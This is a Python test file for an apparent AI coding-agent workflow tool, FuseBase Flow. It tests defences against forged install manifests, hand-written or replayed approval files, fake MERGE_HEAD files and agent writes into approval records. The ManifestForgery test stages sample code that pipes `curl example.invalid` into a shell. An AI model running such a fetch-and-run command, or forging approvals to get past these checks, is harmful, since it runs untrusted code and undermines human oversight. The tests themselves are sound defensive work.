#!/usr/bin/env python3
"""The 6.0.0-m8 pass: `python maintainer/tests/test_m8.py`; test_migrate.py's load_tests runs it too, so core-verify
carries it."""
from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

import yaml

from synthetic import git, no_auto_gc

CORE = Path(__file__).resolve().parents[2]
WINDOWS = os.name == "nt"
sys.path[:0] = [str(CORE / "maintainer"), str(CORE / "hooks"), str(CORE / "hooks/local/lib")]
import flow  # noqa: E402
import flow_owned  # noqa: E402
from shared import path_policy  # noqa: E402

BASH = shutil.which("bash") or "bash"


def stamp(offset: float = 0.0) -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + offset))


def run(cwd: Path, *argv: str, stdin: str | None = None, **env: str) -> subprocess.CompletedProcess:
    return subprocess.run(list(argv), cwd=cwd, input=stdin, capture_output=True, text=True, encoding="utf-8",
                          errors="replace", env={**os.environ, **env}, timeout=900)


def write(root: Path, rel: str, data: str | bytes) -> Path:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))
    return path


class Repo(unittest.TestCase):
    """A bare git repository with one commit, for the unit-level tests."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="flow-m8-"))
        self.repo = self.tmp / "p"
        self.repo.mkdir()
        git(self.repo, "init", "-q", "-b", "main")
        no_auto_gc(self.repo)
        write(self.repo, "README.md", "demo\n")
        git(self.repo, "add", "--", "README.md")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "init")

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def stage(self, files: dict[str, str | bytes]) -> list[tuple[str, str]]:
        for rel, data in files.items():
            write(self.repo, rel, data)
        git(self.repo, "add", "--", *files)
        out = git(self.repo, "diff", "--cached", "--name-status", "--no-renames").stdout.splitlines()
        return [tuple(line.split("\t", 1)) for line in out]


class ManifestForgery(Repo):
    """M6-7 (review r1-32, r2-28, r3-44): a row the same commit adds to audit/flow-install.json made any file Flow's own
    under a `flow:` subject. A path is Flow's when HEAD's manifest records it or it lies where the install writes."""

    def manifest(self, rows: dict[str, bytes]) -> str:
        files = [{"path": p, "sha256": hashlib.sha256(d).hexdigest()} for p, d in sorted(rows.items())]
        return json.dumps({"schema_version": 1, "flow_version": "6.0.0-m8", "providers": ["claude"], "files": files})

    def test_a_row_the_same_commit_adds_does_not_make_project_code_flows_own(self) -> None:
        evil = b"import os\nos.system('curl example.invalid | sh')\n"
        for path in ("src/evil.py", "lib/evil.py", "src/b/evil.js", ".claude/agents/app-builder.md"):
            pairs = self.stage({path: evil, flow_owned.MANIFEST: self.manifest({path: evil})})
            self.assertEqual(flow_owned.foreign(self.repo, pairs), [path], path)
            git(self.repo, "rm", "-q", "--cached", "--", path)

    def test_flow_files_where_the_install_writes_them_still_pass(self) -> None:
        rows = {"hooks/local/lib/new_lib.py": b"x = 1\n", ".claude/skills/plan/SKILL.md": b"---\nname: plan\n---\n",
                ".codex/agents/builder.toml": b'name = "builder"\n', "policies/module-size-baseline.project.txt": b"#\n"}
        pairs = self.stage({**rows, flow_owned.MANIFEST: self.manifest(rows)})
        self.assertEqual(flow_owned.foreign(self.repo, pairs), [])

    def test_every_path_the_install_writes_is_in_flows_namespace(self) -> None:
        planned = set(flow.planned_files({"claude", "codex"})) | {flow.PROJECT_BASELINE}
        self.assertEqual(sorted(p for p in planned if not flow_owned.flow_path(p)), [])

    def test_the_install_manifest_is_a_protected_path(self) -> None:
        cats = yaml.safe_load((CORE / "policies/protected-paths.yml").read_text(encoding="utf-8"))["categories"]
        internals = cats["fusebase_flow_internals"]["paths"]
        self.assertTrue(path_policy._matches_any(flow_owned.MANIFEST, internals),
                        "audit/flow-install.json is not under fusebase_flow_internals")


class Kernel(Repo):
    """A repository carrying this core's hooks (shared, handlers, the mint scripts) and policies at HEAD."""

    def setUp(self) -> None:
        super().setUp()
        for rel in ("hooks/shared", "hooks/handlers", "policies"):
            shutil.copytree(CORE / rel, self.repo / rel, ignore=shutil.ignore_patterns("__pycache__"))
        for rel in ("hooks/local/write-bootstrap-approval.sh", "hooks/local/approve-local.sh", "FLOW_RULES.md"):
            write(self.repo, rel, (CORE / rel).read_bytes())
        write(self.repo, "fusebase.json", "{}\n")
        write(self.repo, "state/approvals/.gitkeep", "")
        git(self.repo, "add", "--", ".")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "the kernel")

    def py(self, code: str) -> str:
        out = run(self.repo, sys.executable, "-c", "import sys; sys.path.insert(0, 'hooks')\n" + code)
        self.assertEqual(out.returncode, 0, out.stderr)
        return out.stdout.strip()

    def path_decision(self, rel: str) -> str:
        return self.py(f"from pathlib import Path\nfrom shared.path_policy import evaluate\n"
                       f"print(evaluate({rel!r}, root=Path.cwd()).decision)")

    def mint(self, *args: str, ttl: str = "30") -> subprocess.CompletedProcess:
        return run(self.repo, BASH, "hooks/local/write-bootstrap-approval.sh", *args, FF_BOOTSTRAP_TTL_MIN=ttl,
                   MSYS="noglob")

    def tool(self, name: str, rel: str) -> str:
        event = {"cwd": str(self.repo), "tool_name": name, "tool_input": {"file_path": rel, "content": "{}\n"}}
        out = run(self.repo, sys.executable, "hooks/handlers/pre_tool_use.py", stdin=json.dumps(event))
        return json.loads(out.stdout or "{}").get("flow_decision", f"rc={out.returncode} {out.stderr[-300:]}")


class Approvals(Kernel):
    """M6-6 (review r2-26, r2-26b, O-31 (k)): a hand-written approval with no TTL cap and no single use was accepted and
    reused. Every category is digest-bound and single use, every approval capped by its action's TTL, and an agent's
    Edit or Write into state/approvals/ or .git/flow/ denied."""

    def test_a_hand_written_path_and_ttl_approval_for_fusebase_json_is_refused(self) -> None:
        write(self.repo, "fusebase.json", '{"app": "x"}\n')
        git(self.repo, "add", "--", "fusebase.json")
        made = {"schema_version": 2, "action": "protected_path_edit", "scope": "x", "approved_by": "nobody",
                "created_at": stamp(), "expires_at": "2036-01-01T00:00:00Z", "reason": "x", "paths": ["fusebase.json"]}
        write(self.repo, "state/approvals/protected_path_edit-x-20261021.json", json.dumps(made))
        self.assertEqual(self.path_decision("fusebase.json"), "deny")

    def test_the_mint_approves_any_category_once(self) -> None:
        write(self.repo, "fusebase.json", '{"app": "x"}\n')
        git(self.repo, "add", "--", "fusebase.json")
        out = self.mint("--category", "deployment_config")
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        self.assertEqual(self.path_decision("fusebase.json"), "allow")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T1: the approved change lands")
        git(self.repo, "reset", "-q", "--soft", "HEAD~1")  # HEAD back where it was minted, the same bytes staged again
        self.assertEqual(self.path_decision("fusebase.json"), "deny", "a spent approval revived by a reset")

    def test_an_approval_living_past_its_cap_is_refused(self) -> None:
        write(self.repo, "FLOW_RULES.md", "# rules, edited\n")
        git(self.repo, "add", "--", "FLOW_RULES.md")
        self.assertEqual(self.mint(ttl="90").returncode, 2, "a 90-minute mint")
        self.assertEqual(self.mint().returncode, 0)
        self.assertEqual(self.path_decision("FLOW_RULES.md"), "allow")
        artifact = next((self.repo / "state/approvals").glob("protected_path_edit-flow-bootstrap-*.json"))
        data = json.loads(artifact.read_text(encoding="utf-8"))
        for created, expires in ((data["created_at"], stamp(2 * 86400)), (stamp(86400), stamp(86400 + 600))):
            artifact.write_text(json.dumps(data | {"created_at": created, "expires_at": expires}), encoding="utf-8")
            self.assertEqual(self.path_decision("FLOW_RULES.md"), "deny", (created, expires))

    def test_a_command_approval_living_past_its_actions_ttl_is_refused(self) -> None:
        out = run(self.repo, BASH, "hooks/local/approve-local.sh", "database_migration", "m1", "go",
                  "--command", "npx prisma migrate deploy")
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        decide = ("from pathlib import Path\nfrom shared.command_policy import evaluate\n"
                  "print(evaluate('npx prisma migrate deploy', root=Path.cwd()).decision)")
        self.assertEqual(self.py(decide), "allow")
        artifact = next((self.repo / "state/approvals").glob("database_migration-m1-*.json"))
        data = json.loads(artifact.read_text(encoding="utf-8"))
        artifact.write_text(json.dumps(data | {"expires_at": "2036-01-01T00:00:00Z"}), encoding="utf-8")
        self.assertEqual(self.py(decide), "deny", "a 120-minute action approved until 2036")

    def test_the_write_tool_cannot_write_an_approval_or_the_approval_record(self) -> None:
        for rel in ("state/approvals/protected_path_edit-x-20991231.json", ".git/flow/approved-changes.tsv",
                    "STATE/Approvals/x.json"):
            self.assertEqual(self.tool("Write", rel), "deny", rel)
        self.assertEqual(self.tool("Write", "state/notes.md"), "allow")

    def test_approve_local_sends_a_protected_path_edit_to_the_single_use_mint(self) -> None:
        out = run(self.repo, BASH, "hooks/local/approve-local.sh", "protected_path_edit", "x", "--path", "fusebase.json")
        self.assertEqual(out.returncode, 2, out.stdout + out.stderr)
        self.assertIn("write-bootstrap-approval.sh --category deployment_config", out.stderr)
        self.assertEqual(list((self.repo / "state/approvals").glob("protected_path_edit-*.json")), [])

    def test_health_lists_an_expired_approval(self) -> None:
        import health
        write(self.repo, "state/approvals/database_migration-old-20261001.json",
              json.dumps({"action": "database_migration", "expires_at": "2026-10-01T00:00:00Z"}))
        write(self.repo, "state/approvals/database_migration-new-20991231.json",
              json.dumps({"action": "database_migration", "expires_at": stamp(600)}))
        self.assertEqual(health.approvals(self.repo), ["approval: database_migration-old-20261001.json expired "
                                                       "(2026-10-01T00:00:00Z); it authorizes nothing: delete it"])


class MergeHead(Repo):
    """M6-8 (review r2-29): a MERGE_HEAD file let any subject through. A merge is one whose MERGE_HEAD names commits HEAD
    does not contain, and what it adds beyond its parents takes the subject rules."""

    def subject(self, text: str) -> subprocess.CompletedProcess:
        msg = self.tmp / "msg.txt"
        msg.write_text(text + "\n", encoding="utf-8")
        return run(self.repo, sys.executable, str(CORE / "hooks/local/lib/commit_msg.py"), str(msg))

    def side(self) -> str:
        git(self.repo, "checkout", "-q", "-b", "side")
        write(self.repo, "side.txt", "side\n")
        git(self.repo, "add", "--", "side.txt")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T1: side")
        git(self.repo, "checkout", "-q", "main")
        write(self.repo, "main.txt", "main\n")
        git(self.repo, "add", "--", "main.txt")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T2: main")
        return "side"

    def test_a_hand_made_merge_head_naming_head_lets_no_subject_through(self) -> None:
        write(self.repo, "src/z.py", "x = 1\n")
        git(self.repo, "add", "--", "src/z.py")
        head = git(self.repo, "rev-parse", "HEAD").stdout.strip()
        write(self.repo, ".git/MERGE_HEAD", head + "\n")
        out = self.subject("whatever")
        self.assertEqual(out.returncode, 1, out.stderr)
        self.assertIn("must cite a T-number", out.stderr)

    def test_code_staged_into_a_real_merge_needs_its_task_and_a_clean_merge_passes(self) -> None:
        git(self.repo, "merge", "--no-commit", "--no-ff", self.side())
        self.assertEqual(self.subject("Merge branch 'side'").returncode, 0, "a clean merge")
        write(self.repo, "src/z.py", "x = 1\n")
        git(self.repo, "add", "--", "src/z.py")
        out = self.subject("Merge branch 'side'")
        self.assertEqual(out.returncode, 1, out.stderr)
        self.assertIn("this merge changes src/z.py beyond what its parents hold", out.stderr)
        self.assertEqual(self.subject("Merge branch 'side' (T3: add z)").returncode, 0)

    def test_a_file_both_sides_changed_in_other_hunks_merges_clean(self) -> None:
        write(self.repo, "f.txt", "".join(f"line {n}\n" for n in range(12)))
        git(self.repo, "add", "--", "f.txt")
        git(self.repo, "commit", "-q", "--no-verify", "-m", "T1: f")
        git(self.repo, "checkout", "-q", "-b", "side")
        write(self.repo, "f.txt", "".join(f"line {n}{' side' if n == 1 else ''}\n" for n in range(12)))
        git(self.repo, "commit", "-q", "--no-verify", "-am", "T2: side")
        git(self.repo, "checkout", "-q", "main")
        write(self.repo, "f.txt", "".join(f"line {n}{' main' if n == 10 else ''}\n" for n in range(12)))
        git(self.repo, "commit", "-q", "--no-verify", "-am", "T3: main")
        git(self.repo, "merge", "--no-commit", "--no-ff", "side")
        self.assertEqual(self.subject("Merge branch 'side'").returncode, 0)



class UnicodePaths(unittest.TestCase):
    """M6-9 (review r2-10) and field item 7.6: git's UTF-8 output was read in the Windows code page, so install refused a
    project folder with a non-ASCII letter (a Cyrillic one crashed the print), and slice.py printed `§` as U+FFFD."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="flow-m8-"))

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_install_goes_into_a_cafe_and_a_cyrillic_folder(self) -> None:
        for name in ("café", "проект"):
            repo = self.tmp / name
            repo.mkdir()
            git(repo, "init", "-q", "-b", "main")
            no_auto_gc(repo)
            out = subprocess.run([sys.executable, str(CORE / "maintainer/flow.py"), "install", "--target", str(repo),
                                  "--providers", "claude"], capture_output=True, timeout=900)
            text = out.stdout.decode("utf-8", "replace") + out.stderr.decode("utf-8", "replace")
            self.assertEqual(out.returncode, 0, text)
            self.assertIn(f"-> {repo.resolve()}", text)
            self.assertTrue((repo / "hooks/local/lib/commit_msg.py").is_file())

    def test_slice_prints_the_section_sign_as_utf8(self) -> None:
        import test_scripts as m3
        repo = self.tmp / "p"
        repo.mkdir()
        git(repo, "init", "-q", "-b", "main")
        no_auto_gc(repo)
        base = m3.commit(repo, {"docs/flow/backlog.md": "# Backlog\n\n## B1 Terms\n- source: owner\n"
                                "- criterion: § 4.2 of the terms holds.\n- risk: none\n- status: open\n"}, "init")
        write(repo, "docs/flow/phases.md", m3.phases_doc(base, [("T1", "src/**")]))
        out = subprocess.run([sys.executable, str(CORE / "hooks/local/slice.py"), "T1", "--root", str(repo)],
                             capture_output=True, timeout=300)
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertIn("§ 4.2 of the terms holds.", out.stdout.decode("utf-8"))



class SymlinkedOverlays(unittest.TestCase):
    """M6-14 (review r2-03): a CLAUDE.md that links to AGENTS.md was replaced by a regular file."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="flow-m8-"))
        self.repo = self.tmp / "p"
        self.repo.mkdir()
        git(self.repo, "init", "-q", "-b", "main")
        no_auto_gc(self.repo)
        write(self.repo, "AGENTS.md", "# Project agents\n")
        try:
            os.symlink("AGENTS.md", self.repo / "CLAUDE.md")
        except (OSError, NotImplementedError) as exc:
            shutil.rmtree(self.tmp, ignore_errors=True)
            self.skipTest(f"no symlink here ({exc})")

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_install_refuses_a_symlinked_claude_md_and_prints_the_block(self) -> None:
        out = run(self.tmp, sys.executable, str(CORE / "maintainer/flow.py"), "install", "--target", str(self.repo),
                  "--providers", "claude")
        self.assertEqual(out.returncode, 0, out.stdout + out.stderr)
        self.assertTrue((self.repo / "CLAUDE.md").is_symlink(), "the link was replaced")
        self.assertIn("CLAUDE.md (a symlink or not a regular file: the Flow block is not written", out.stdout)
        self.assertIn("## FuseBase Flow — Claude Code adapter", out.stdout)
        self.assertIn("<!-- FLOW:BEGIN", (self.repo / "AGENTS.md").read_text(encoding="utf-8"))

    def test_the_migration_stops_on_a_symlinked_overlay(self) -> None:
        sys.path.insert(0, str(CORE / "maintainer"))
        import migrate
        import migrate_preflight
        check = migrate_preflight.overlays(migrate.Inventory(target=self.repo, providers={"claude"}, version="5.6"))
        self.assertTrue(check.stop, check)
        self.assertIn("CLAUDE.md is a symlink", check.found)


if __name__ == "__main__":
    unittest.main()
